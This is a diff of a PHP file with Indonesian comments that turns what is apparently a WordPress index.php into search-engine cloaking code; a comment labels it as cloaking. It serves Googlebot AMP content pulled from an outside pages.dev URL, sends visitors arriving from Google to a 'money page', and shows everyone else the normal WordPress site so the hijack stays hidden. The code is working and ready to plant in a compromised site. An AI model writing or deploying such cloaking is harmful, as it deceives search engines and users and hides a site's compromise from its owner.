@@ -1,7 +1,10 @@
 <?php
-// 1. Konfigurasi Link/File
-$amp_valid_source = 'wp-content/upgrade/index.php'; // File HTML AMP Murni untuk Google
-$money_page = 'home.php'; // Taro landing Pages Disini
+/**
+ * 1. KONFIGURASI LINK & FILTERING
+ * Masukkan link atau path file yang sesuai di sini.
+ */
+$amp_valid_source = 'https://amp-resetmeplease.pages.dev/'; // URL Konten AMP untuk Bot
+$money_page       = 'home.php'; // File Landing Page/Halaman Utama
 
 $googleBots = array(
     "Googlebot",
@@ -9,14 +12,14 @@ $googleBots = array(
     "Google-InspectionTool",
     "Googlebot-Mobile",
     "Googlebot-News",
-    "Mediapartners-Google" // Tambahan untuk Adsense bot
+    "Mediapartners-Google"
 );
 
 $isGoogleBot = false;
-$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+$userAgent   = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+$referer     = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
 
-// 2. Cek apakah ini Bot Google
+// 2. CEK APAKAH INI BOT GOOGLE
 foreach ($googleBots as $bot) {
     if (stripos($userAgent, $bot) !== false) {
         $isGoogleBot = true;
@@ -24,38 +27,42 @@ foreach ($googleBots as $bot) {
     }
 }
 
-// 3. Cek apakah traffic datang dari Google (Referrer)
-// User yang klik dari hasil pencarian Google biasanya membawa referrer 'google.com'
+// 3. CEK APAKAH TRAFFIC DATANG DARI GOOGLE (REFERRER)
 $isFromGoogle = (stripos($referer, 'google.com') !== false || stripos($referer, 'ampproject.org') !== false);
 
 /**
- * LOGIKA PENYARINGAN:
- * - Jika Bot Google: Kasih konten AMP (agar validasi hijau/sukses).
- * - Jika User klik dari Google (AMP Referrer): Kasih Money Page (atau redirect).
- * - Selain itu (Direct/Bot lain): Kasih konten AMP atau halaman netral.
+ * 4. LOGIKA PENYARINGAN (CLOAKING)
  */
 
 if ($isGoogleBot) {
-    // Tampilkan konten AMP asli agar Google menganggap halaman ini valid
-    if (file_exists($amp_valid_source)) {
-        echo file_get_contents($amp_valid_source);
+    // Jika Bot Google: Berikan konten AMP murni agar validasi sukses
+    $content = @file_get_contents($amp_valid_source);
+    if ($content !== false) {
+        echo $content;
     } else {
-        echo "AMP Content Missing"; // Debugging
+        echo "AMP Content Missing";
     }
     exit;
 } 
 
 if ($isFromGoogle) {
-    // User asli dari Google, arahkan ke halaman utama/penjualan
-    include($money_page);
-    exit;
-} else {
-    // Jika traffic direct atau dari sumber lain, tampilkan AMP agar aman
-    if (file_exists($amp_valid_source)) {
-        echo file_get_contents($amp_valid_source);
-    } else {
+    // Jika User Klik dari Google: Arahkan ke Money Page
+    if (file_exists($money_page)) {
         include($money_page);
+    } else {
+        // Jika file money_page tidak ada, jalankan WordPress (Fallback)
+        define( 'WP_USE_THEMES', true );
+        require __DIR__ . '/wp-blog-header.php';
     }
     exit;
 }
-?>
+
+/**
+ * 5. JALANKAN WORDPRESS (DEFAULT)
+ * Jika traffic direct atau bot lain, jalankan WordPress secara normal.
+ * Anda juga bisa mengubah bagian ini untuk menampilkan AMP jika ingin lebih ketat.
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
